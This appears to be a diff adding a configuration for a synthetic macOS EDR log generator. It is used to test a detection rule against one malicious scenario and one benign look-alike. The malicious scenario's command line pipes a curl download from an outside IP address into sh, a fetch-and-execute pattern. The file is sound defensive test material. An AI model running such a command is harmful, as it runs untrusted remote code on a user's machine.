@@ -1,0 +1,85 @@
+# A small macOS shop: users with laptops running an EDR that logs process creation.
+# One malicious scenario (osascript -> shell -> curl payload) and one benign look-alike
+# (osascript -> shell, but a harmless command) that a naive rule would false-positive on.
+seed: 7
+start: 2026-01-05T00:00:00Z
+duration: 24h
+
+entities:
+  workstation:
+    count: 25
+    fields:
+      name: "mac-{n:04}"
+      ip: {ipv4: 10.30.0.0/16}
+  user:
+    count: 25
+    skew: 1.1
+    fields:
+      name: "{first}.{last}"
+      team: {choice: {engineering: 50, design: 25, sales: 25}}
+      workstation: {entity: workstation.name}
+      workstation_ip: {entity: workstation.ip}
+
+sources:
+  edr_process:
+    index: edr
+    sourcetype: edr:process
+    host_field: device
+    rate: 800/h
+    time: {field: timestamp, format: iso_ms}
+    fields:
+      event_id: {uuid: true}
+      device: {entity: user.workstation}
+      user: {entity: user.name}
+      process:
+        choice:
+          /Applications/Safari.app/Contents/MacOS/Safari: 30
+          /Applications/Google Chrome.app/Contents/MacOS/Google Chrome: 20
+          /usr/bin/osascript: 6
+          /bin/zsh: 20
+          /bin/bash: 8
+          /usr/bin/curl: 6
+          /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder: 10
+      parent_process:
+        choice:
+          /sbin/launchd: 60
+          /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder: 25
+          /bin/zsh: 15
+      cmdline:
+        map: process
+        default: "{process}"
+        values:
+          /bin/zsh: "zsh -c 'git status'"
+          /bin/bash: "bash -lc 'ls -la'"
+          /usr/bin/curl: "curl https://updates.example.com/manifest.json"
+
+scenarios:
+  # osascript spawns a shell that curls a payload and runs it -> the detection must fire.
+  - id: osascript_shell_download
+    label: malicious
+    description: AppleScript shelling out to download and execute a payload.
+    mitre: [T1059.002, T1059.004]
+    at: 15h
+    bind:
+      user: {where: {team: engineering}}
+    steps:
+      - source: edr_process
+        set:
+          parent_process: /usr/bin/osascript
+          process: /bin/sh
+          cmdline: "sh -c 'curl -fsSL http://185.203.116.7/x | sh'"
+
+  # Same process tree (osascript -> shell), but a harmless command: the detection must NOT fire.
+  # A rule that keyed only on the parent/child pair, without the command-line filter, would.
+  - id: dev_osascript_dialog
+    label: benign
+    description: A developer's AppleScript that shells out to show a local notification.
+    at: 10h
+    bind:
+      user: {where: {team: design}}
+    steps:
+      - source: edr_process
+        set:
+          parent_process: /usr/bin/osascript
+          process: /bin/sh
+          cmdline: "sh -c 'echo build complete'"
